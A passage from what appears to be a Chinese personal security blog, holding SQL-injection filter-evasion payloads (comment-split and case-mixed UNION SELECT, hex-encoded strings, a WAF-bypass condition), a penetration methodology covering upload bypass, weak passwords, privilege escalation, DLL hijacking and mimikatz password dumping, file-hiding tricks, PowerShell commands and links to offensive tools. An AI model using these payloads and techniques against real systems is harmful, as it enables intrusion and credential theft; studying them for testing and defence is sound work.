+<p>4、通过类型转换修饰符N绕过<br>可以说这是一个不错的想法，他除了能在某种程度上绕过限制，而且还有别的作用，大家自己好好想想吧。关于利用，如or swords &#x3D; N swords ，大写的N告诉mssql server 字符串作为nvarchar类型，它起到类型转换的作用，并不影响注射语句本身，但是可以避过基于知识的模式匹配IDS。</p>
+<p>5、通过+号拆解字符串绕过<br>效果值得考证，但毕竟是一种方法。如or swords &#x3D;‘sw + ords ；EXEC(‘IN + SERT INTO + ….. )</p>
+<p>6、通过LIKE绕过<br>以前怎么就没想到呢？如orswords LIKE sw！！！显然可以很轻松的绕过“&#x3D;”“&gt;”的限制……</p>
+<p>7、通过IN绕过<br>与上面的LIKE的思路差不多,如or swords IN (swords)</p>
+<p>8、通过BETWEEN绕过<br>如or swords BETWEEN rw AND tw</p>
+<p>9、通过&gt;或者&lt;绕过<br>or swords &gt; sw<br>or swords &lt; tw<br>or 1&lt;3<br>……</p>
+<p>10、运用注释语句绕过<br>用&#x2F;<strong>&#x2F;代替空格，如：UNION &#x2F;</strong>&#x2F; Select &#x2F;<strong>&#x2F;user，pwd，from tbluser<br>用&#x2F;</strong>&#x2F;分割敏感词，如：U&#x2F;<strong>&#x2F; NION &#x2F;</strong>&#x2F; SE&#x2F;<strong>&#x2F; LECT &#x2F;</strong>&#x2F;user，pwd from tbluser</p>
+<p>11、用HEX绕过，一般的IDS都无法检测出来<br>0x730079007300610064006D0069006E00 &#x3D;hex(sysadmin)<br>0x640062005F006F0077006E0065007200 &#x3D;hex(db_owner)</p>
+<p>12、大小写互换绕过<br>select 可以写成 SelEct<br>union 可以写成 UnIoN</p>
+<p>13、多种编码组合绕过<br>常用的有BASE64、ASC、SQL、HEX、URL编码</p>
+<p>14、利用中转工具绕过<br>可以利用刺猬的中转工具来绕过</p>
+<p>15、利用特殊字符填充绕过<br>这些特殊字符，会被解释成空格，方式和通过空格绕过一样的，一般用来绕过第三方防火墙软件</p>
+<dl><dt>16、改变攻击方式<br>如果get提交实在无法绕过，可以尝试改变攻击方式。如；post注入、寻找子站、旁站……等<br>过安全狗：and ‘1’ in(‘1’)<br>空格 - %20<br>“ - %22<br># - %23<br>% - %25<br>&amp; - %26<br>( - %28<br>) - %29<br>+ - %2B<br>, - %2C<br>&#x2F; - %2F</dt><dd>- %3A<br>; - %3B<br>&lt; - %3C<br>&#x3D; - %3D<br>&gt; - %3E<br>? - %3F<br>@ - %40<br>\ - %5C<br>| - %7C</dd></dl><h3 id="渗透大牛思路"><a href="#渗透大牛思路" class="headerlink" title="渗透大牛思路"></a>渗透大牛思路</h3><p>（一）针对网站程序，不考虑服务器。</p>
+<p>一、查找注入，注意数据库用户权限和站库是否同服。</p>
+<p>二、查找XSS，最近盲打很流行，不管怎样我们的目的是进入后台。</p>
+<p>三、查找上传，一些能上传的页面，比如申请友链、会员头像、和一些敏感页面等等，注意查看验证方式是否能绕过，注意结合服务器的解析特性，比如典型的IIS6.0、阿帕奇等。</p>
+<p>四、查找编辑器，比较典型的ewebeditor、fckeditor等等。</p>
+<p>五、查找phpmyadmin等管理程序，可以尝试弱口令，或者寻找其漏洞。</p>
+<p>六、百度、谷歌搜索程序公开漏洞。</p>
+<p>七、猜解文件，如知道某文件为admin_login.php,我们可尝试admin_add.php、admin_upload.php文件是否存在，也可以谷歌搜索site:cnseay.com inurl:edit等等，很多时候可以找到一些敏感文件，接着看是否验证权限或能否绕过验证，这像冰风说高级语法。</p>
+<p>八、会员注册、修改、删除、评论等一切需要操作数据库的地方记得加单引号之类查看是否存在insert、update等类型注入。</p>
+<p>九、会员或低权限管理登陆后可抓包分析，尝试修改超级管理员密码，权限提升。</p>
+<p>十、通常有下载功能的站我们可以尝试修改下URL文件名，看能否下载站点敏感文件，如数据库配置文件等，数据库不可外连情况下可以尝试数据库密码登陆后台，也可下载上传、登陆验证等文件进行代码审计。</p>
+<p>十一、备份文件和后门，某些主站子目录存在分站，比如<a target="_blank" rel="noopener" href="http://www.cnseay.com/seay/%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%B0%9D%E8%AF%95www.cnseay.com/seay.rar/zip%E7%AD%89%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%EF%BC%8C%E5%8F%AF%E8%83%BD%E5%B0%B1%E6%98%AF%E5%AD%90%E7%AB%99%E7%9A%84%E6%BA%90%E7%A0%81%E3%80%82%E4%B9%9F%E6%9C%89%E4%B8%80%E4%BA%9B%E7%AB%99%E7%B1%BB%E4%BC%BC%E8%BF%99%E6%A0%B7www.cnseay.com/old/%EF%BC%8C%E4%B8%80%E8%88%AC%E9%83%BD%E6%98%AF%E4%BB%A5%E5%89%8D%E7%9A%84%E8%80%81%E7%AB%99%EF%BC%8C%E9%80%9A%E5%B8%B8%E8%80%81%E7%AB%99%E4%BC%9A%E6%AF%94%E8%BE%83%E5%AE%B9%E6%98%93%E6%8B%BF%E3%80%82%E8%BF%98%E6%9C%89%E5%B0%B1%E6%98%AF%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E3%80%81%E5%89%8D%E4%BA%BA%E7%9A%84%E5%90%8E%E9%97%A8%E7%AD%89%EF%BC%8C%E5%85%B7%E4%BD%93%E8%BF%99%E4%BA%9B%E7%9B%AE%E5%BD%95%E4%B8%8A%E7%9A%84%E4%B8%9C%E8%A5%BF%E5%B0%B1%E8%A6%81%E7%9C%8B%E4%BD%A0%E7%9A%84%E5%AD%97%E5%85%B8%E4%BA%86%E3%80%82">www.cnseay.com/seay/，我们可以尝试www.cnseay.com/seay.rar/zip等压缩文件是否存在，可能就是子站的源码。也有一些站类似这样www.cnseay.com/old/，一般都是以前的老站，通常老站会比较容易拿。还有就是数据库备份、前人的后门等，具体这些目录上的东西就要看你的字典了。</a></p>
+<p>十二、0day漏洞，不管是别人给你的，还是自己挖的，总之好使就行。</p>
+<p>十三、。。。</p>
+<p>（二）针对服务器</p>
+<p>一、通常先扫下服务器开放的端口，再考虑对策。</p>
+<p>二、比较常见的解析漏洞，比如IIS6.0、阿帕奇、nginx&#x2F;IIS7.0(php-fpm)解析漏洞等，还有就是cer、asa之类的解析，.htaccess文件解析配置等。</p>
+<p>三、弱口令和everyone权限，先扫描服务器开放的端口，比如21对应的FTP、1433对应的MSSQL、3306对应的MYSQL、3389对应的远程桌面、1521对应的Oracle等等，平时可以多搜集下字典，有时候效果也是不错的(通常在cain嗅探的时候，经常能嗅到别人不停的扫…很蛋疼)。</p>
+<p>四、溢出，这点要看系统补丁和服务器使用的软件等等，比如FTP等工具，这里不详解。</p>
+<p>五、针对一些服务器管理程序，比如tomcat、jboss等等，这种比较常见于大中型的站点服务器。</p>
+<p>六、IIS、apache等各种漏洞，这个要平时多关注。</p>
+<p>七、目录浏览，服务器配置不当，可直接浏览目录。</p>
+<p>八、共享…</p>
+<p>九、。。。<br>（三）针对人，社工</p>
+<p>社工在渗透中通常能起到惊人的效果，主要还是利用人的弱点，博大精深，这里不详细讨论，注意平时多看一些社工文章，学习一些思路、技巧。</p>
+<p>（四）迂回战术，旁注和C段</p>
+<p>一、旁注，针对旁站，我们可以运用到上面说到的方法，这里不多说。</p>
+<p>二、C段，基本想到C段就会想到cain，针对C段的站点和服务器，结合上面说的针对目标站、服务器、人、旁站的思路，一个道理，当然如果你的目的仅仅是黑站的话，不妨试试NetFuke之类。</p>
+<p>三、…<br>（五）提权常用手段</p>
+<p>一、使用系统溢出提权EXP，这类在提权中最常用，使用的方法大都一致，比如比较常见的巴西烤肉、pr等等，溢出提权通常在Linux上也利用的比较多，注意多收集EXP。</p>
+<p>二、第三方软件提权，主要还是利用服务器上安装的第三方软件拥有比较高的权限，或者软件的溢出漏洞，比如典型的mssql、mysql、serv-u等等，还有各种远程控制软件，比如pcanywhere、Radmin这类。</p>
+<p>三、劫持提权，说到这个，想必肯定会想到lpk.dll这类工具，有时候在蛋疼怎么都加不上账户的时候，可以试试劫持shift、添加开机启动等等思路。</p>
+<p>四、弱口令技巧，我们可以看看有木有什么hack、或者隐藏账户之类的，一般这种用户密码都比较简单，可以尝试下弱口令，还有之前说过的各种数据库、远程控制软件、FTP软件的弱口令，没办法的时候就去扫扫碰碰运气吧。</p>
+<p>五、信息收集，注意翻下硬盘各种文档，说不定各种密码就在里面。在内网渗透时，信息收集是非常重要的，记得拿下服务器了GET一下明文密码，德国那个mimikatz不错，还有就是域、ARP。。。貌似扯多跑题了。</p>
+<p>六、社工…不多说。</p>
+<h3 id="关于漏洞复现"><a href="#关于漏洞复现" class="headerlink" title="关于漏洞复现"></a>关于漏洞复现</h3><p>cve-2019-0708</p>
+<p>通过3389的udp打蓝屏</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cve-2019-11043</span><br><span class="line"></span><br><span class="line">https://www.cnblogs.com/yankaohaitaiwei/p/11795972.html</span><br><span class="line"></span><br><span class="line">https://www.secpulse.com/archives/117525.html</span><br><span class="line"></span><br><span class="line">https://cloud.tencent.com/developer/article/1530703</span><br><span class="line"></span><br><span class="line">cve-2019-14287 sudo提权漏洞</span><br><span class="line"></span><br><span class="line">https://www.cnblogs.com/mark-zh/p/11679015.html</span><br><span class="line"></span><br><span class="line">cve-2018-13024</span><br><span class="line"></span><br><span class="line">https://www.freebuf.com/news/193748.html</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="关于文件隐藏"><a href="#关于文件隐藏" class="headerlink" title="关于文件隐藏"></a>关于文件隐藏</h1><h2 id="驱动级的文件隐藏"><a href="#驱动级的文件隐藏" class="headerlink" title="驱动级的文件隐藏"></a>驱动级的文件隐藏</h2><p>有如下特征：<br>系统目录存在如下文件:<br>c:\WINDOWS\xlkfs.dat<br>c:\WINDOWS\xlkfs.dll<br>c:\WINDOWS\xlkfs.ini<br>c:\WINDOWS\system32\drivers\xlkfs.sys</p>
+<p>此驱动级隐藏文件会在服务项增加一个xlkfs的服务<br>驱动文件路径为：c:\WINDOWS\system32\drivers\xlkfs.sys<br>配置文件路径为：c:\WINDOWS\xlkfs.ini（<strong>这里会注明隐藏文件的路径</strong>）</p>
+<p><strong>清理：</strong></p>
+<p>1、查询服务状态：sc qc xlkfs</p>
+<p>2、停止服务：net stop xlkfs</p>
+<p>3、删除服务：sc delete xlkfs</p>
+<p>4、删除系统目录下面的文件</p>
+<p>5、重启系统，确认服务已经被清理了</p>
+<h2 id="文件隐藏的部分原理"><a href="#文件隐藏的部分原理" class="headerlink" title="文件隐藏的部分原理"></a>文件隐藏的部分原理</h2><p>常见的文件夹加密方法被我归纳为以下4种：</p>
+<ul>
+<li><p>利用windows系统特殊的保留文件名后缀，使文件夹无法打开和删除。<br>例如类似1.{20D04FE0-3AEA-1069-A2D8-08002B30309D}等文件夹名称。</p>
+</li>
+<li><p>利用回收站特点，将文件夹保存在回收站，然后创建创建名为recycle或者RECYCLED的伪回收站。</p>
+</li>
+<li><p>直接将系统—文件夹的对应关系破坏，<br>在系统中留下一个没有文件实际地址的文件目录，<br>而在加密软件中则保存该文件夹的实际地址。</p>
+</li>
+<li><p>通过系统驻留程序监控被加密的文件夹，如果需打开，则提示输入密码，而实际上并没有对文件进行加密。</p>
+</li>
+</ul>
+<p>以上<br>第1种方法大概是最常见的方法之一，容易实现，也最容易破解。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">首先是新建文件夹命名为以下名字，再重命名在前面加上xxxx.，即可完成伪装</span><br><span class="line"></span><br><span class="line">现在网上流行的文件夹加密软件比较多,他们其实是将文件夹伪装成系统文件，只需要在要加密的文件夹后面加一个如以下代码的扩展名即可实现。</span><br><span class="line">管理工具</span><br><span class="line">&#123;D20EA4E1-3957-11d2-A40B-0C5020524153&#125;</span><br><span class="line">公文包</span><br><span class="line">&#123;85BBD92O-42A0-1O69-A2E4-08002B30309D&#125;</span><br><span class="line">控制面板</span><br><span class="line">&#123;21EC2O2O-3AEA-1O69-A2DD-08002b30309d&#125;</span><br><span class="line">字体</span><br><span class="line">&#123;D20EA4E1-3957-11d2-A40B-0C5020524152&#125;</span><br><span class="line">历史记录</span><br><span class="line">&#123;FF393560-C2A7-11CF-BFF4-444553540000&#125;</span><br><span class="line">收件箱</span><br><span class="line">&#123;00020D75-0000-0000-C000-000000000046&#125;</span><br><span class="line">Microsoft网络</span><br><span class="line">&#123;00028B00-0000-0000-C000-000000000046&#125;</span><br><span class="line">我的电脑</span><br><span class="line">&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;</span><br><span class="line">我的文档</span><br><span class="line">&#123;450D8FBA-AD25-11D0-98A8-0800361B1103&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第2种方法也比较容易破解。国内2大著名的加密软件都使用这方法。<br>第3种方法对于不了解原理的人来说应该有一定难度。<br>第4种方法首先要杀死进程才能进一步进行破解。<br>我想如果结合以上第3、4种方法做为家用加密软件还是比较有实用价值的吧…………</p>
+<h1 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h1><p>Power是一个功能强大的shell，从面向用户而言，个人觉得其功能强大体现在以下几方面：</p>
+<p>（1） 微软态度。微软是真正的在推行PowerShell，包括Office等更多自家软件，底层都是调用PowerShell来实现。</p>
+<p>（2） 兼容性cmd。PowerShell包含原先cmd的所有命令，原先命令使用形式不变，在是在其基础上添加命令。</p>
+<p>（3） 对标Linux。PowerShell使用了Linux Shell的思想，也就是所有的系统操作、配置，都可以在shell中敲写命令实现。</p>
+<p>（4） 统一的命令格式和自包含的文档。</p>
+<h2 id="powershell的使用"><a href="#powershell的使用" class="headerlink" title="powershell的使用"></a>powershell的使用</h2><h3 id="启动PowerShell"><a href="#启动PowerShell" class="headerlink" title="启动PowerShell"></a>启动PowerShell</h3><p>方法一： 直接在cmd中执行powershell，切换为powershell</p>
+<p>方法二： 开始菜单中输入powershell启动powershell</p>
+<p>方法三： 开始菜单—-附件—-powershell启动</p>
+<p>带x86的是32位的，不带的是64位的；带ies的是简单的ide</p>
+<h3 id="使用powershell"><a href="#使用powershell" class="headerlink" title="使用powershell"></a>使用powershell</h3><ul>
+<li><p>get-help查看帮助（get-help 想要获取帮助的命令）</p>
+</li>
+<li><p>get-command查看有哪些命令</p>
+<ul>
+<li>CommandType列，表示命令类型，Alias是别名、Cmdlet是powershell格式的命令、Function是函数</li>
+<li>Name列，就是命令</li>
+<li>Definition列，命令功能的简单描述</li>
+</ul>
+</li>
+<li><p>get-command缩小范围</p>
+<ul>
+<li>get-command get-*列出了所有get开头的命令</li>
+<li>get-process的命令，获取进程信息的，get-process -name *typora</li>
+</ul>
+</li>
+<li><p>stop-process -id pid杀除命令</p>
+</li>
+</ul>
+<h2 id="powershell的命令"><a href="#powershell的命令" class="headerlink" title="powershell的命令"></a>powershell的命令</h2><p>　<strong>入门级别</strong></p>
+<p>　　1. 像文件系统那样操作Windows Registry——cd hkcu:（切换到注册表）<br>　　2. 在文件里递回地搜索某个字符串——dir –r | select string “searchforthis”<br>　　3. 使用内存找到五个进程——ps | sort –p ws | select –last 5<br>　　4. 循环（停止，然后重启）一个服务，如DHCP——Restart-Service DHCP<br>　　5. 在文件夹里列出所有条目——Get-ChildItem – Force<br>　　6. 递归一系列的目录或文件夹——Get-ChildItem –Force c:\directory –Recurse<br>　　7. 在目录里移除所有文件而不需要单个移除——Remove-Item C:\tobedeleted –Recurse<br>  8. 重启当前计算机——(Get-WmiObject -Class Win32_OperatingSystem -ComputerName .).Win32Shutdown(2)</p>
+<pre><code> **收集信息**
+</code></pre>
+<ol start="9">
+<li>获取计算机组成或模型信息——Get-WmiObject -Class Win32_ComputerSystem</li>
+<li>获取当前计算机的BIOS信息——Get-WmiObject -Class Win32_BIOS -ComputerName .</li>
+<li>列出所安装的修复程序（如QFE或Windows Update文件）——Get-WmiObject -Class Win32_QuickFixEngineering -ComputerName .</li>
+<li>获取当前登录计算机的用户的用户名—— Get-WmiObject -Class Win32_ComputerSystem -Property UserName -ComputerName .</li>
+<li>获取当前计算机所安装的应用的名字——Get-WmiObject -Class Win32_Product -ComputerName . | Format-Wide -Column 1</li>
+<li>获取分配给当前计算机的IP地址——Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled&#x3D;TRUE -ComputerName . | Format-Table -Property IPAddress</li>
+<li>获取当前机器详细的IP配置报道——Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled&#x3D;TRUE -ComputerName . | Select-Object -Property [a-z]* -ExcludeProperty IPX*,WINS*</li>
+<li>找到当前计算机上使用DHCP启用的网络卡——Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter “DHCPEnabled&#x3D;true” -ComputerName .</li>
+<li>在当前计算机上的所有网络适配器上启用DHCP——Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled&#x3D;true -ComputerName . | ForEach-Object -Process {$_.EnableDHCP()}</li>
+</ol>
+<p>　　<strong>软件管理</strong></p>
+<p>　　18. 在远程计算机上安装MSI包——(Get-WMIObject -ComputerName TARGETMACHINE -List | Where-Object -FilterScript {$_.Name -eq “Win32_Product”}).Install(\MACHINEWHEREMSIRESIDES\path\package.msi)<br>　　19. 使用基于MSI的应用升级包升级所安装的应用——(Get-WmiObject -Class Win32_Product -ComputerName . -Filter “Name&#x3D;’name_of_app_to_be_upgraded’”).Upgrade(\MACHINEWHEREMSIRESIDES\path\upgrade_package.msi)<br>　　20. 从当前计算机移除MSI包——(Get-WmiObject -Class Win32_Product -Filter “Name&#x3D;’product_to_remove’” -ComputerName . ).Uninstall()<br>　　机器管理<br>　　21. 一分钟后远程关闭另一台机器——Start-Sleep 60; Restart-Computer –Force –ComputerName TARGETMACHINE<br>　　22. 添加打印机——(New-Object -ComObject WScript.Network).AddWindowsPrinterConnection(\printerserver\hplaser3)<br>　　23. 移除打印机——(New-Object -ComObject WScript.Network).RemovePrinterConnection(“\printerserver\hplaser3 “)<br>　　24. 进入PowerShell会话——invoke-command -computername machine1, machine2 -filepath c:\Script\script.ps1</p>
+<h2 id="powershell渗透工具"><a href="#powershell渗透工具" class="headerlink" title="powershell渗透工具"></a>powershell渗透工具</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">nishang</span><br><span class="line">https://blog.csdn.net/m0_37438418/article/details/80327624</span><br><span class="line"></span><br><span class="line">Empire	PowerShell后期漏洞利用代理工具</span><br><span class="line">不多说 给链接 实战中有时候比msf更好用</span><br><span class="line">http://www.freebuf.com/articles/web/76892.html</span><br><span class="line">https://github.com/EmpireProject/Empire</span><br><span class="line">https://blog.csdn.net/a1453514850/article/details/88102779</span><br><span class="line"></span><br><span class="line">绕过PowerShell Execution Policy</span><br><span class="line">https://www.freebuf.com/articles/system/93829.html</span><br><span class="line"></span><br><span class="line">PowerSploit上面有很多powershell攻击脚本，它们主要被用来渗透中的信息侦察、权限提升、权限维持。</span><br><span class="line">https://github.com/PowerShellMafia/PowerSploit</span><br><span class="line">具体利用</span><br><span class="line">https://xz.aliyun.com/t/263</span><br><span class="line">https://www.secpulse.com/archives/55893.html</span><br><span class="line"></span><br><span class="line">其它姿势</span><br><span class="line">http://www.freebuf.com/sectool/90362.html</span><br><span class="line">http://www.freebuf.com/articles/system/133640.html</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershell取证</span><br><span class="line">http://bobao.360.cn/learning/detail/570.html</span><br><span class="line"></span><br><span class="line">powershell对日志分析</span><br><span class="line">https://www.cnblogs.com/xiaozi/p/9284138.html</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">XiongTaoTao</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2019/12/31/12.31/">http://example.com/2019/12/31/12.31/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">技术阿涛</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/DOS/">DOS</a><a class="post-meta__tags" href="/tags/powershell/">powershell</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/01/02/1.2/" title="1-2"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">1-2</div></div></a></div><div class="next-post pull-right"><a href="/2019/12/30/12.30/" title="12-30"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">12-30</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">XiongTaoTao</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">55</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DOS%E5%91%BD%E4%BB%A4"><span class="toc-number">1.</span> <span class="toc-text">DOS命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DOS%E4%BD%BF%E7%94%A8%E5%B8%B8%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">DOS使用常识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DOS%E7%9A%84%E6%A6%82%E5%86%B5"><span class="toc-number">1.1.1.</span> <span class="toc-text">DOS的概况</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOS%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.</span> <span class="toc-text">DOS常用命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.2.1.</span> <span class="toc-text">查看服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.2.2.</span> <span class="toc-text">查看端口</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.</span> <span class="toc-text">渗透相关命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.1.</span> <span class="toc-text">域渗透命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="toc-number">1.3.2.</span> <span class="toc-text">内网渗透思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86"><span class="toc-number">1.3.3.</span> <span class="toc-text">绕过注入整理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E5%A4%A7%E7%89%9B%E6%80%9D%E8%B7%AF"><span class="toc-number">1.3.4.</span> <span class="toc-text">渗透大牛思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.3.5.</span> <span class="toc-text">关于漏洞复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8F"><span class="toc-number">2.</span> <span class="toc-text">关于文件隐藏</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A9%B1%E5%8A%A8%E7%BA%A7%E7%9A%84%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8F"><span class="toc-number">2.1.</span> <span class="toc-text">驱动级的文件隐藏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8F%E7%9A%84%E9%83%A8%E5%88%86%E5%8E%9F%E7%90%86"><span class="toc-number">2.2.</span> <span class="toc-text">文件隐藏的部分原理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#powershell"><span class="toc-number">3.</span> <span class="toc-text">powershell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#powershell%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">3.1.</span> <span class="toc-text">powershell的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8PowerShell"><span class="toc-number">3.1.1.</span> <span class="toc-text">启动PowerShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8powershell"><span class="toc-number">3.1.2.</span> <span class="toc-text">使用powershell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#powershell%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">3.2.</span> <span class="toc-text">powershell的命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#powershell%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7"><span class="toc-number">3.3.</span> <span class="toc-text">powershell渗透工具</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/03/10/3-10/" title="3.1"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="3.1"/></a><div class="content"><a class="title" href="/2023/03/10/3-10/" title="3.1">3.1</a><time datetime="2023-03-10T12:01:33.000Z" title="发表于 2023-03-10 20:01:33">2023-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/10/restart/" title="restart"><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230310201154080.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="restart"/></a><div class="content"><a class="title" href="/2023/03/10/restart/" title="restart">restart</a><time datetime="2023-03-10T11:43:42.000Z" title="发表于 2023-03-10 19:43:42">2023-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/03/24/3.24/" title="3-24"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="3-24"/></a><div class="content"><a 